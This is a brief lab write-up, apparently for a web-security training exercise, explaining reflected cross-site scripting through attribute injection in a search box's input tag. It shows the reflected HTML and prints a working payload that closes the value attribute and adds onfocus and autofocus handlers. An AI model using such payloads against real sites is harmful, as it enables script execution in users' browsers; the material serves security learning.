This lab html-encodes `<` and `>`.
The search string is reflected twice in the html source.

```
<section class=blog-header>
    <h1>3 search results for 'test'</h1>
    <hr>
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search value="test">
        <button type=submit class=button>Search</button>
    </form>
</section>
```

The second occurrence can be used to inject further attributes in the input tag.
Input tags support the `onfocus` and `autofocus` attributes.
Those can be used to store and automatically trigger the js.

```
" onfocus="alert(1)" autofocus="
```
